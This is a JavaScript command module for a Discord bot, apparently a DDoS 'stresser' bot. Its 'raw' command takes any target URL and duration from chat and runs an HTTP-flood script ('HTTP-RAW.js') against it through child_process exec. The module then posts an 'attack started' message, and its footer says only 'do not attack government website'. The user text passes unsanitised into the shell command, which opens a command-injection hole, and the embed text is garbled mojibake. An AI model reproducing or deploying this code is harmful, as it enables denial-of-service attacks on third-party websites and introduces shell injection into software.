const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex ;raw https://example.com/ 60`")
	.setFooter("Please do not attack government website!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node HTTP-RAW.js ${host} ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('ð **LÉªá´É´YT Bá´á´ð¥** ð')
	.setTimestamp()
  .setDescription("**ððµðªð·**: `VÉªá´ ð¥` \n **ð£ðªð»ð°ð®ð½** : `" + host + "` \n **ðð®ð½ð±ð¸ð­** : `HTTP-RAW ð£` \n **ð£ð²ð¶ð®** : `" + duration + "`")
	.setFooter('Â© Developer: LionGamingYT#6704', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://tenor.com/view/explosion-boom-gif-8911363", "https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('ð **LÉªá´É´YT Bá´á´ð¥** ð')
	.setTimestamp()
	.setDescription("**âº PÊá´á´sá´ Wá´Éªá´ Fá´Ê Cá´Êá´á´á´¡É´ **")
	.setFooter('Â© Developer: LionGamingYT#6704', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['raw'],
  permLevel: 0
}

exports.help = {
  name: 'raw',
  description: 'LionGamingYT',
  usage: 'raw'
}
